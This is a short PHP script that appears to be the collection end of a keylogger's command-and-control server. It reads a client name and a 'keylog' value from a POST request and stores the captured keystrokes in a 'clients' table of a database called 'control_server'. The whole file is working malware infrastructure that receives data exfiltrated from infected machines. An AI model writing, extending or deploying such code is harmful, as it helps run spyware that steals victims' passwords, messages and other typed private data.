<?php

if(isset($_POST['client']) && !empty($_POST['client'])){
	$client = $_POST['client'];
	$keylog = $_POST['keylog'];
	
	$db = new mysqli('localhost', 'root','', 'control_server');
	if(mysqli_connect_errno()) exit;
	
		
	//-- client sends result to server
	$query = "UPDATE clients SET keylog=? WHERE name=?";
	$stmt = $db->prepare($query);
	$stmt->bind_param('ss', $keylog, $client); 
	$stmt->execute();
	
	$db->close();	
}
?>